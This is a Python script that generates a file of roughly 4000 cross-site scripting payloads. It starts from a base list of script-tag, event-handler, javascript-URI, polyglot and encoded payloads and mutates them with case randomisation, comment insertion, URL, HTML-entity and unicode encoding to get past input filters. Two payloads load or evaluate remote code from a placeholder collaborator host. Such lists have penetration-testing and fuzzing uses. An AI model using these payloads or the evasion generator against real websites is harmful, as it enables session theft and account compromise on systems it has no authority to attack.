#!/usr/bin/env python3
"""
XSS Payload Generator - creates a custom payload file with 4000+ entries.
"""

import random
import argparse

OUTPUT_FILE = "xss_payloads.txt"
TARGET_COUNT = 4000

BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=prompt(1)>",
    "<img src=x onerror=confirm(1)>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    "\" onfocus=alert(1) autofocus \"",
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "<svg><script>alert(1)</script>",
    "<math><mtext><script>alert(1)</script>",
    "<script src=//COLLABORATOR></script>",
    "<img src=x onerror=eval(atob('COLLABORATOR'))>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<!–><script>alert(1)</script>",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<img src=x onerror=\nalert(1)>",
    "<img src=x onerror=\talert(1)>",
    "<script>\\u0061lert(1)</script>",
    "<iframe src=data:text/html,<script>alert(1)</script>>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<link rel=import href='javascript:alert(1)'>",
    "<video><source onerror=alert(1)>",
    "<audio><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)><option>1</option></select>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
]


def random_case(s: str) -> str:
    return "".join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in s)


def insert_comments(s: str) -> str:
    if "<" in s and ">" in s:
        parts = s.split(">", 1)
        return parts[0] + "><!-- -->" + parts[1]
    return s


def url_encode(s: str, full: bool = False) -> str:
    if full:
        return "".join("%" + hex(ord(c))[2:].zfill(2).upper() for c in s)
    encoded = ""
    for c in s:
        if c in '<>"\'&;=':
            encoded += "%" + hex(ord(c))[2:].zfill(2).upper()
        else:
            encoded += c
    return encoded


def html_entity_encode(s: str) -> str:
    entities = {
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
        "&": "&amp;",
        "(": "&#40;",
        ")": "&#41;",
        "=": "&#61;",
        ":": "&#58;",
        ";": "&#59;",
    }
    return "".join(entities.get(c, c) for c in s)


def js_unicode_escape(s: str) -> str:
    return "".join("\\u" + hex(ord(c))[2:].zfill(4) if c.isalpha() else c for c in s)


def add_whitespace(s: str) -> str:
    if " " in s:
        return s.replace(" ", random.choice(["\n", "\t", " "]), random.randint(1, 3))
    return s


def combine_mutations(payload: str) -> str:
    mutations = [
        random_case,
        insert_comments,
        lambda p: url_encode(p, full=False),
        lambda p: url_encode(p, full=True),
        html_entity_encode,
        js_unicode_escape,
        add_whitespace,
    ]
    chosen = random.sample(mutations, min(random.randint(1, 3), len(mutations)))
    result = payload
    for mut in chosen:
        result = mut(result)
    return result


def generate_payloads(target_count: int) -> list[str]:
    payloads = set(BASE_PAYLOADS)
    attempts = 0
    max_attempts = target_count * 5

    while len(payloads) < target_count and attempts < max_attempts:
        base = random.choice(BASE_PAYLOADS)
        payloads.add(combine_mutations(base))
        attempts += 1

    for i in range(1, 50):
        payloads.add(f"<script>alert({i})</script>")
        payloads.add(f"<img src=x onerror=alert({i})>")

    payloads_list = list(payloads)
    random.shuffle(payloads_list)
    return payloads_list[:target_count]


def write_payload_file(output_file: str = OUTPUT_FILE, target_count: int = TARGET_COUNT) -> int:
    payloads = generate_payloads(target_count)
    with open(output_file, "w", encoding="utf-8") as f:
        for p in payloads:
            if "COLLABORATOR" in p:
                p = p.replace("COLLABORATOR", "YOUR-COLLABORATOR-HERE")
            f.write(p + "\n")
    return len(payloads)


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate large XSS payload file.")
    parser.add_argument("--output", default=OUTPUT_FILE, help="Output payload file path")
    parser.add_argument("--count", type=int, default=TARGET_COUNT, help="Approx payload count")
    args = parser.parse_args()

    print(f"[*] Generating approximately {args.count} XSS payloads...")
    written = write_payload_file(args.output, args.count)
    print(f"[+] Done. Wrote {written} payloads to {args.output}")


if __name__ == "__main__":
    main()

